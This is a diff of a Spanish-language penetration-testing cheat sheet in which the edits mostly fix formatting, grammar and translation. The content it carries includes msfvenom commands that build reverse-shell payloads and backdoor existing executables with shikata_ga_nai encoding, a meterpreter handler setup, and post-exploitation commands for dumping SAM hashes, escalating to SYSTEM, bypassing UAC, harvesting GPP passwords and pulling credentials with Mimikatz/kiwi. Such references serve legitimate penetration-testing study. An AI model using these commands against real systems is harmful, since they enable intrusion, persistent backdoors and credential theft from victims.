@@ -308,9 +308,9 @@ snmpenum -t 192.168.1.X
 ```  
 
 **Archivos de configuracion relacionados a SNMP**  
-snmp.conf
-snmpd.conf
-snmp-config.xml  
+snmp.conf  
+snmpd.conf  
+snmp-config.xml    
 
 ## Enumerando MySQL
 
@@ -358,9 +358,9 @@ UNIX
   - /etc/my.cnf
 
 Otros Archivos.  
-connections.log
-update.log
-common.log
+connections.log  
+update.log  
+common.log  
 
 **Creaccion de usuarios**  
 Crear usuario y otorgarle privilegios:  
@@ -490,7 +490,7 @@ i586-mingw32msvc-gcc exploit.c -lws2_32 -o exploit.exe
 
 ## Sniffer Trafic
 
-En el siguiente comando, realizo un capturo los paquetes del puerto 80 por el protocolo TCP por medio de la interfaz eth0 y exporto el resultado en un archivo con nombre *output.pcap*.  
+En el siguiente comando, realizo una captura de los paquetes del puerto 80 por el protocolo TCP por medio de la interfaz eth0 y exporto el resultado en un archivo con nombre *output.pcap*.  
 
 ```  
 tcpdump tcp port 80 -w output.pcap -i eth0
@@ -686,16 +686,16 @@ Usando man, more, less
 
 | Comandos         | Explicacion                                                                 |
 | --------         | ------------------------------------------------------------------          |
-| msfvenom -p php/meterpreter_reverse_tcp LHOST={DNS / IP / VPS IP} LPORT={PORT / Forwarded PORT} -f raw > example.php | Creacion del Shell Inversa para PHP por el protocolo TCP
-| msfvenom -p windows/meterpreter/reverse_tcp LHOST={DNS / IP / VPS IP} LPORT={PORT / Forwarded PORT} -f asp > example.asp | Creacion del Shell Inversa para ASP por el protocolo TCP
-| msfvenom -p java/jsp_shell_reverse_tcp LHOST={DNS / IP / VPS IP} LPORT={PORT / Forwarded PORT} -f raw > example.jsp | Creats a Creacion del Shell Inversa para JSP por el protocolo TCP
-| msfvenom -p java/jsp_shell_reverse_tcp LHOST={DNS / IP / VPS IP} LPORT={PORT / Forwarded PORT} -f war > example.war | Creacion del Shell Inversa para WAR por el protocolo TCP |
+| msfvenom -p php/meterpreter_reverse_tcp LHOST={DNS / IP / VPS IP} LPORT={PORT / Forwarded PORT} -f raw > example.php | Creacion de Shell Inversa para PHP por el protocolo TCP
+| msfvenom -p windows/meterpreter/reverse_tcp LHOST={DNS / IP / VPS IP} LPORT={PORT / Forwarded PORT} -f asp > example.asp | Creacion de Shell Inversa para ASP por el protocolo TCP
+| msfvenom -p java/jsp_shell_reverse_tcp LHOST={DNS / IP / VPS IP} LPORT={PORT / Forwarded PORT} -f raw > example.jsp | Creacion de Shell Inversa para JSP por el protocolo TCP
+| msfvenom -p java/jsp_shell_reverse_tcp LHOST={DNS / IP / VPS IP} LPORT={PORT / Forwarded PORT} -f war > example.war | Creacion de Shell Inversa para WAR por el protocolo TCP |
 
 ### Windows Payloads
 
 | Comandos         | Explicacion                                                                 |
 | --------         | ------------------------------------------------------------------          |
-| msfvenom -l encoders | Lists all avalaible encoders
+| msfvenom -l encoders | Lista los encoders disponibles
 | msfvenom -x base.exe -k -p windows/meterpreter/reverse_tcp LHOST={DNS / IP / VPS IP} LPORT={PORT / Forwarded PORT} -f exe > example.exe |	Enlazar un ejecutable con un backdoor ejecutable EXE
 | msfvenom -p windows/meterpreter/reverse_tcp LHOST={DNS / IP / VPS IP} LPORT={PORT / Forwarded PORT} -e x86/shikata_ga_nai -b ‘\x00’ -i 3 -f exe > example.exe | Crea una carga útil simple para el protocolo TCP con el codificador shikata_ga_nai
 | msfvenom -x base.exe -k -p windows/meterpreter/reverse_tcp LHOST={DNS / IP / VPS IP} LPORT={PORT / Forwarded PORT} -e x86/shikata_ga_nai -i 3 -b “\x00” -f exe > example.exe | Enlazar un ejecutable con un backdoor y lo codifica con shikata_ga_nai |
@@ -713,7 +713,7 @@ Usando man, more, less
 **Como conseguir una shell con meterpreter!**
 
 ```zsh  
-╭─[~/Desktop/APOLO/Ethic4l-Hacking/Operations/Premium/Bastard]─[root@Arthorias]─[0]─[4186]
+╭─[~/Desktop/APOLO/Ethic4l-Hacking/]─[root@Arthorias]─[0]─[4186]
 ╰─[:)] # msfconsole
 msf5 > use exploit/multi/handler
 msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
@@ -729,105 +729,104 @@ msf5 exploit(multi/handler) > run
 
 Luego de comprometer una maquina y tener una shell de meterpreter, hay multiples comandos que nos facilitaran la vida en la hora de interactuar con nuestra maquina victima.  
 
+Como subir un archivo a una maquina comprometida con windows
 ```  
 upload file c:\\windows
 ```  
-Como subir un archivo a una maquina comprometida con windows
 
+Como descargar un archivo que este alojado en el equipo victima y guardarlo en nuestro equipo.
 ```  
 download c:\\windows\\repair\\sam /tmp
 ```  
-Como descargar un archivo que este alojado en el equipo victima y guardarlo en nuestro equipo.
 
+Como ejecutar archivos (EXE) alojados en la maquina comprometida.  
+*Esto es util para la ejecucion de exploits.*
 ```  
 execute -f c:\\windows\temp\exploit.exe
 ```  
-Como ejecutar archivos (EXE) alojados en la maquina comprometida.  
-*Esto es util para la ejecucion de exploits.*
 
+Crea un nuevo canal con una Shell de CMD
 ```  
 execute -f cmd -c
 ```  
-Crea un nuevo canal con una Shell de CMD
 
+Como ver los procesos que corre nuestra maquina comprometida.  
 ```  
 ps
 ```  
-Como ver los procesos que corre nuestra maquina comprometida.  
 
+Como obtener una shell en la maquina comprometida.  
 ```  
 shell
 ```  
-Como obtener una shell en la maquina comprometida.  
 
+Realizar un intento para escalar privilegios sobre el sistema.  
 ```  
 getsystem
 ```  
-Realizar un intento para escalar privilegios sobre el sistema.  
 
+El comando hashdump permite obtener los usuarios y el hash de los passwords de la maquina remota en formato SAM, de esta forma se puede crakear la clave de un usuario determinado usando herramientas como john the ripper o ophcrack
 ```  
 hashdump
 ```  
-El comando hashdump permite obtener los usuarios y el hash de los passwords de la maquina remota en formato SAM, de esta forma se puede crakear la clave de un usuario determinado usando herramientas como john the ripper o ophcrack
 
+Como redirigir puertos a través de la máquina comprometida hacia nosotros los atacantes.
 ```  
 portfwd add -l 3389 -p 3389 -r target
 ```  
-Como redirigir puertos a través de la máquina comprometida hacia nosotros los atacantes.
 
+Eliminar alguna redireccion de puertos previamente configurada.
 ```  
 portfwd delete -l 3389 -p 3389 -r target
 ```  
-Eliminar la redireccion de puertos.
 
+Burlar el Control de Cuentas de Usuario (UAC) en Windows 7 // Indicar la IP de la victima como target + arch, x86/64
 ```  
 use exploit/windows/local/bypassuac
 ```  
-Burlar el Control de Cuentas de Usuario (UAC) en Windows 7 // Indicar la IP de la victima como target + arch, x86/64
 
+Analizador de directorios HTTP
 ```  
 use auxiliary/scanner/http/dir_scanner
 ```  
-Analizador de directorios HTTP
 
+Escaner de vulnerabilidades para JBOSS
 ```  
 use auxiliary/scanner/http/jboss_vulnscan
 ```  
-Escaner de vulnerabilidades para JBOSS
 
+Modulo para autenticarse en el servicio MSSQL.
 ```  
 use auxiliary/scanner/mssql/mssql_login
 ```  
-Modulo para autenticarse en el servicio MSSQL.
 
+Identificar la version de MySQL.
 ```  
 use auxiliary/scanner/mysql/mysql_version
 ```  
-Identificar la version de MySQL.
 
+Modulo para autenticarse en el servicio de Oracle
 ```  
 use auxiliary/scanner/oracle/oracle_login
 ```  
-Modulo para autenticarse en el servicio de Oracle
 
+Ejecucion de script en powershell para una sesion de meterpreter
 ```  
 post/windows/manage/powershell/exec_powershell
 ```  
-Ejecucion de script en powershell para una sesion de meterpreter
 
+Ver privilegios del usuario actual.
 ```  
 run post/windows/gather/win_privs
 ```  
-Ver privilegios del usuario actual.
 
+Obtener contraseñas guardadas GPP
 ```  
 use post/windows/gather/credentials/gpp
 ```  
-Obtener contraseñas guardadas GPP
 
+Cargar Mimikatz/kiwi para conseguir credenciales de usuarios autenticados.
 ```  
 load kiwi
 creds_all
-```  
-Cargar Mimikatz/kiwi para conseguir credenciales de usuarios autenticados.
-
+```
